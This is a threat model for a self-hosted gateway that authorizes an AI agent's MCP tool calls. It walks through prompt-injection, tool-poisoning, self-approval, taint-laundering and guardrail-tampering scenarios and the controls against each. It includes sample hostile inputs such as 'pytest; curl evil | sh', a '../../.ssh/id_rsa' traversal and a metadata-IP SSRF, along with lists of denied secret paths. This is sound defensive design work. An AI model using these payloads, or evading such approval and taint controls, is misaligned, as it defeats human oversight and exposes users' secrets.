# Mellyn Security Runtime Gateway — Threat Model

**Scope**: Plane 3 — Self-Hosted MCP Tool-Call Authorizer (`backend/aegis_ai/`).
**Deployment Model (v1)**: Single-tenant, self-hosted container or local sidecar running inside the customer's VPC or developer workstation.
**Status legend**: controls marked *(planned)* are design commitments that the code does not implement yet.

---

## 1. Assets & Trust Boundaries

### Critical Assets
1. **Authorization Policy & MCP Allowlist**: Determines which tools, arguments, and network destinations an agent may invoke.
2. **Session Taint State & Human Grants**: Tracks whether untrusted external data has entered a session and stores short-lived approvals for exact calls.
3. **Audit Logs**: Record of every tool-call authorization decision, taint event, and risk signal.
4. **API Credentials**: The **agent key** (held by the agent harness) and the **approver key** (held only by the human approval surface), stored server-side as `HMAC-SHA256(pepper, key)` digests.

### Trust Boundaries
```text
[ Untrusted External Data: Web, Issues, PRs, 3rd-Party MCP Responses ]
        │  (Boundary 1: Session becomes TAINTED — automatically when the authorizer allows
        │   a web fetch or an untrusted MCP server call; otherwise reported by the harness)
        ▼
[ AI Agent / LLM Runtime (Probabilistic, Assumed Prompt-Injectable) ]
        │  (Boundary 2: Harness submits each tool call with the agent key; fail-closed)
        ▼
[ Mellyn Security Authorizer Core (Deterministic Policy + Taint + Exact-Call Grants) ] ◄── Approver key (humans only)
        │  (Boundary 3: Workspace path jail + egress URL checks; Squid egress proxy in the container stack)
        ▼
[ Downstream MCP Servers / Local Shell / Internal APIs / Cloud ]
```

**Core Assumption**: The LLM and agent loop are **inside the blast radius of indirect prompt injection**. Security guarantees must hold even when the model is actively trying to invoke unauthorized tools or exfiltrate secrets.

**Integration modes**:
- **stdio MCP gateway** (`mcp_gateway.py`): the MCP client launches the gateway instead of its servers, and the gateway launches the servers. Every tool call and resource read passes through the authorizer. One gateway process fronts all of the client's servers, so they share one session. This holds only if the client has no other, direct route to those servers: remove them from the client's own MCP config.
- **HTTP API** (`api.py`): a custom harness calls the authorizer before running each tool. It only protects tool calls the harness submits, and the agent key must not be reachable from the agent's own tools (bind the API to a socket or network the agent's shell and HTTP tools cannot reach).

---

## 2. Deployment & Operational Decisions

| Decision | v1 Choice (Self-Hosted) | Security Rationale |
| :--- | :--- | :--- |
| **Tenancy & Isolation** | **Single-tenant per deployment** (1 container / VPC per SMB customer). | Eliminates cross-tenant data leakage, shared-memory side channels, and multi-tenant SOC 2 custody of raw prompts/secrets. |
| **Credentials** | **Two keys, two roles.** The agent key can create sessions, report taint, and request decisions. Only the approver key can issue grants. The service refuses to start serving (503) if the keys are missing or identical. | An agent that holds its own credential must not be able to approve its own calls. |
| **Session State** | **Server-issued session IDs**; unknown IDs are denied. State is in memory, so a restart invalidates every session. Persistent state is *(planned)*. | A caller cannot shed taint by inventing a fresh ID, and a restart fails closed instead of resetting tainted sessions to clean. |
| **Audit Log Content** | **Redacted structured metadata only** (decision, tool name, MCP server, SHA-256 argument hash, taint sources, reasons). Raw prompts, secret values, and full tool payloads are **never** persisted by default. | Prevents the audit log itself from becoming a secondary credential/PII store. The argument hash is unsalted, so treat the log as confidential. Retention is customer-controlled *(planned: 30–90 day default)*. |
| **Failure Mode** | The authorizer fails closed internally (unknown tool → `HIGH`, unknown session → `DENY`, missing credentials → 503). Harnesses must treat a timeout or error from the authorizer as `DENY`; that is the integrator's responsibility until the gateway mode exists. | If the authorizer crashes, times out, or is misconfigured, an agent must never silently gain unrestricted shell/network access. |
| **Approval Grants** | **One exact call**: bound to session, tool, MCP server, and the full argument set; expires (default 15 min, max 24 h); single-use unless the approver sets `max_uses`. | Approving `git_push(branch="feature/x")` can never authorize `feature/x:main` or an added `force=True`. |

---

## 3. Threat Matrix (STRIDE & OWASP Agentic/LLM)

| ID | Threat | Attack Scenario | Mitigation in Mellyn Security |
| :--- | :--- | :--- | :--- |
| **TM-01** | **Indirect Prompt Injection -> Unauthorized Tool Execution** (`OWASP LLM01 / Agentic Goal Hijacking`) | Malicious instructions in a GitHub issue or fetched webpage instruct the agent to run `curl` or `rm` or post `.env` to Slack. | Ingesting external content taints the session (automatically for allowed web fetches and untrusted MCP servers). Any `MEDIUM`/`HIGH`-risk tool in a tainted session requires approval unless an exact, taint-safe policy rule matches. |
| **TM-02** | **SSRF, DNS Rebinding & Redirect Bypass** (`OWASP A10`) | Agent calls an HTTP tool with `http://169.254.169.254`, an IPv6-mapped loopback address, or a domain that resolves to `127.0.0.1` after validation (DNS rebinding) or 302-redirects internally. | (1) `egress.py` rejects non-HTTPS URLs, every IP literal, userinfo, `localhost`/`.local` names, and hosts outside the domain allowlist. (2) In the container stack (`deploy/`), the gateway and its MCP servers sit on an internal network whose only way out is a Squid proxy generated from the same allowlist: CONNECT to port 443 only, allowlisted domains only, private/loopback/link-local/metadata destinations blocked after DNS resolution, and a redirect to another host is a new CONNECT that must pass the same checks. **Not covered:** tools running directly on a developer machine. **Tested** against a rebinding name that flips between 127.0.0.1 and a public IP: Squid checked and connected with the same cached answer and never connected to the private address in 64 attempts (see `deploy/README.md`). |
| **TM-03** | **Path Traversal / Secret File Exfiltration** (`OWASP A01 / LLM02`) | Prompt-injected agent uses a `LOW`-risk `workspace_read` tool with `../../.ssh/id_rsa` or `.env` to read secrets. | Paths are resolved (`Path.resolve()`, which follows symlinks), confined to the workspace root, and denied for secret files (`.env*`, keys, `credentials.json`, `.git-credentials`, `.npmrc`, `.pypirc`, `.netrc`, `.git/config`) and directories (`.ssh`, `.aws`, `.kube`, `.gnupg`, `.docker`, `.azure`, `gcloud`, `secrets`) regardless of taint state. The check happens before the tool runs, so a symlink swapped in afterwards is a residual risk (see §4). |
| **TM-04** | **Approval Fatigue ("Taint Explosion")** | Session becomes tainted on turn 1; constant approval prompts cause engineers to rubber-stamp malicious calls. | Exact, taint-safe policy rules allow known-safe calls without prompting (e.g. `argv == ["pytest", "tests"]`). Grants can be given `max_uses` for a repeated identical call. |
| **TM-05** | **Self-Modification of Guardrails** (`Agentic Privilege Escalation`) | Agent writes `.agent/rules/`, `.claude/settings.json`, `.github/`, the authorizer's own source, or `.git/hooks/` (code that runs on the developer's next commit). | Workspace writes to guardrail paths are hard-denied, case-insensitively, even with a grant: `.git/`, `.agent/`, `.claude/`, `.semgrep/`, `.github/`, `backend/aegis_ai/`, agent instruction files, gate configs, and the security tests. `.claude/settings.json` asks before edits, and CODEOWNERS plus branch protection *(to configure on GitHub)* require review. |
| **TM-06** | **Audit Log Tampering or Secret Leakage** | Sensitive API keys passed in tool arguments get written to plaintext logs, or an attacker floods/forges log entries. | `audit.py` hashes raw arguments (`SHA-256`), redacts known secret prefixes/patterns in reasons and taint origins, and emits structured JSONL. The gateway writes it to a dedicated `--audit-log` file, never to the stderr it shares with downstream servers, so a server cannot forge entries; the gateway also hard-protects that file from agent writes. Shipping to append-only storage (SIEM / S3 Object Lock) is *(planned)*. |
| **TM-07** | **Gateway Bypass (Direct Tool Invocation)** | An agent or developer script calls an MCP server directly, bypassing the authorizer. | stdio gateway mode: the gateway launches the downstream servers as its own child processes, so the client only reaches them through it, provided the client's MCP config lists only the gateway. Stdio servers have no network listener to bypass. *(planned)* For network (HTTP) MCP servers: bind them to an internal network and require a gateway-issued token. In HTTP API mode protection still depends on the harness submitting every call. |
| **TM-11** | **Cross-Server Taint Loss** | The agent reads an injected GitHub issue through one MCP server, then calls a shell tool on another; a per-server gateway would start that server's session clean. | One gateway process and one session for all of a client's servers. |
| **TM-12** | **Tool Identity Spoofing & Tool Poisoning** (`Agentic Tool Misuse`) | A downstream server names a dangerous tool `workspace_read` to inherit its low tier, or puts instructions in its tool descriptions or `initialize` instructions. | Tools are exposed and tiered as `<server>__<tool>` / `"<server>/<tool>"`; unlisted MCP tools are `HIGH`; ALLOW rules must name their server. The gateway answers `initialize` itself, so downstream `instructions` never reach the client, and listing tools or resources from an untrusted server taints the session. Pinning approved tool descriptions against later changes ("rug pulls") is *(planned)*. |
| **TM-13** | **Protocol Confusion** | A downstream server interleaves notifications, sampling/elicitation requests or junk lines so its replies get attributed to the wrong request, or asks the client's model to generate text (`sampling/createMessage`). | Downstream replies are matched by gateway-issued request ID; notifications are dropped except content-free `list_changed`; server-to-client requests are refused with an error; malformed and oversized lines are discarded; timeouts and closed servers return errors instead of hanging. |
| **TM-14** | **Approval Channel Abuse** | The agent (via a shell tool) calls the approval server to approve its own held call, or a planted URL makes the approver CLI send the key elsewhere. | The approval server binds to `127.0.0.1` and requires the approver key, which the agent side never holds. The CLI sends the key only to loopback `http://` URLs, with proxies disabled. Held calls are shown to the approver with full reasons; the agent only receives an approval ID, not the rule that held it. |
| **TM-08** | **Agent Self-Approval** | A prompt-injected agent (or its harness) calls the grants endpoint to approve its own pending call. | Grants require the approver key, which is a different key from the agent key and is never given to the harness. `approved_by` is recorded but not authenticated per person; per-user sign-in for approvers is *(planned)*. |
| **TM-09** | **Taint Laundering** | The agent starts a fresh session ID, or waits for a restart, to get a clean session after reading untrusted content. | Session IDs are issued by the authorizer and unknown IDs are denied; restart invalidates all sessions. Residual: whoever holds the agent key can create a new session, so the harness, not the model, must own session lifecycle. |
| **TM-10** | **Shell Injection Through Allowed Commands** | An allow rule for `pytest` is matched by `pytest; curl evil \| sh` or `pytest -p evil_plugin`. | Shell tools accept only an `argv` list; command strings and interpreters (`sh`, `bash`, `cmd`, `powershell`, `env`, `xargs`, ...) are denied. Allow rules match the exact `argv` and reject extra arguments. |
| **TM-15** | **Hard Boundaries Bypassed by Tool Naming** | A real MCP filesystem server exposes `read_file` / `write_file` / `move_file`, not `workspace_read`; guards keyed to built-in tool names never run, so a LOW-tier `read_file` reads `.env`. | **Capability bindings** attach guards to arguments, not names: `tool_capabilities."<server>/<tool>"` (path read/write args, path lists, URL args, an argv arg, or `pure`), `server_presets` (`mcp-filesystem`, `mcp-fetch`) for off-the-shelf servers, and built-ins for the canonical names. A policy that marks any tool LOW or MEDIUM without a binding fails to load. Tools with no binding (HIGH, approval-only) still have path-like arguments (`path`, `file`, `source`, `destination`, ...) checked as writes, so even an approved call cannot touch secrets, guardrails or `.git/`. A `url` argument is egress-checked on every tool. |
| **TM-16** | **Injection Hidden in Error Replies** | An untrusted server returns its injected instructions as a JSON-RPC error instead of a result, hoping the session is not tainted. | The gateway taints on anything a server wrote, results and errors alike (it relays both to the agent). Only errors the gateway generates itself when a server never answers (timeouts, closed pipes) leave the session clean; a server cannot make its reply look like one. |

---

## 4. Residual Risks (Accepted or Open)

- **Running tests executes workspace code.** A taint-safe rule for `pytest` runs whatever code is in the workspace. This is acceptable only because writes in a tainted session require approval; an approver who approves a write is approving code that the test rule will later run.
- **Deny rules are a blocklist.** A rule denying `rm` does not stop `python -c "import shutil; ..."`. Deny rules are defense in depth; the boundary is that HIGH-risk calls default to approval.
- **Check-then-use on paths.** The authorizer validates a path; the tool opens it later. A symlink created between the two is not caught. The planned gateway should perform file operations itself, or tools should open with `O_NOFOLLOW` inside a sandbox.
- **Egress outside the container stack.** Tools that run on the developer machine (not inside the gateway container) get only the application-layer URL checks; see TM-02.
- **Authorizer and gateway must see the agent's files.** The path guard resolves symlinks on its own filesystem; the container refuses to start unless the workspace is mounted (`AEGIS_REQUIRE_WORKSPACE_MOUNT`).
- **In-memory state.** No durability or horizontal scaling; a restart ends every session (fails closed). Pending approvals are lost too.
- **Untrusted servers taint every session, unless pinned.** Clients list tools at startup, so an untrusted server's tool descriptions taint the session from the first turn. `pinned_tool_hashes` records the SHA-256 of a `tools/list` an operator has reviewed: a matching listing does not taint, and any change to names, schemas or descriptions ("rug pull") makes `tools/list` fail closed until the pin is updated. Pinning vouches for the descriptions only; the server's results still taint. A pin does not stop the client calling a tool name that was not in the listing; such a tool is unbound and HIGH.
- **Name-guessed path arguments.** For tools without a capability binding, only argument names from a fixed list are treated as paths, and nested or differently named path arguments are not seen. Binding the tool is the fix; the guess only narrows what an approval can authorize.
- **Downstream notifications are dropped.** Progress and log messages from servers do not reach the client; only `list_changed` does.
- **Approval identity is self-declared.** The approver key proves the caller is an approver, but `approved_by` is whatever they type; per-person sign-in is *(planned)*.

---

## 5. Non-Goals (Explicitly Out of Scope for v1)
- **Detecting 100% of prompt injections in free-form text**: Handled as a best-effort risk signal only, never a sole allow/deny boundary.
- **Multi-tenant SaaS prompt storage**: Deferred until v2+ (and if added, restricted to redacted telemetry only).
- **OS kernel sandboxing**: Mellyn Security enforces tool-call policy and egress controls; OS-level isolation (containers, Firecracker, devcontainers) remains a complementary Layer 1 control.
